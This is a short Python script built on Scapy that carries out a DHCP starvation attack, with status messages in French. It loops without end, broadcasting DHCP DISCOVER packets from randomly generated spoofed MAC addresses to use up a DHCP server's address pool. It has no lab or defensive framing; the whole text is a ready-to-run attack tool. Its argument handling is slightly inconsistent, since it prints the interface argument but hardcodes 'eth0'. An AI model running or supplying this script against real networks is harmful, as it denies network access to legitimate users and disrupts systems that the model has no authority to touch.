from scapy.all import *
import sys, random
print(f"[*] Starvation sur {sys.argv[2]} via {sys.argv[1]}")
while True:
    mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    sendp(Ether(dst="ff:ff:ff:ff:ff:ff",src=mac)/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=bytes.fromhex(mac.replace(':','')),xid=random.randint(0,0xFFFFFFFF))/DHCP(options=[("message-type","discover"),"end"]),iface="eth0",verbose=0)
    print(f"[+] {mac}")
